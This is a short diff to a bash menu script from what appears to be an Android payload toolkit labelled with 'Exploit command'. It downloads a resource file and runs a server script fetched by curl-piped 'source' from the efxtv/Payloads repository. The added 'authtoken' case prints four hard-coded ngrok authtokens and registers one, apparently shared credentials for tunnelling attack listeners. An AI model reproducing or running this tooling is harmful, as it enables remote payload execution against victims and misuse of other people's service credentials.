@@ -39,6 +39,17 @@ echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Exploit command:${IGr
 curl -L -o $PWD/export.rc https://raw.githubusercontent.com/efxtv/Payloads/main/android/export.rc -s;;
 
 
+authtoken)
+echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1tebxIB0maaFOCIBo1WmpYo0zGW_3KtM2gXefMR79HBcnGwwM ${clear}"
+echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1bmvO96MSDn7uOGRtB4GWmwoBTc_27GY17KjXZqMPNLEhAYnp ${clear}"
+echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1dLfazAyroRPboegbwh3M7x9Hc8_7Q8wNUYKAxSt5rqXbUwKD ${clear}"
+echo -e "[${Green}✔${clear}] ${Green}Copy paste:${IYellow} 1u7zpuJX1TvWK1MrDvi0fGDHN2G_61AgB79hTep6E5wqaroNd ${clear}"
+echo -en "[${Green}✔${clear}] ${Green}Please enter your authtoken : ${clear}"
+read autho
+$HOME/ngrok authtoken $autho 1>/dev/null
+echo -e "[${Green}✔${clear}] ${Green}Ngrok fixed... try again : ${clear}"
+;;
+
 1)
 echo -e " ${Green}[${IGreen}✔${clear}${Green}] ${IYellow}Your pressed ngrok http..${clear}"
 source <(curl -fsSL https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/server/server-ngrok-http.sh);;
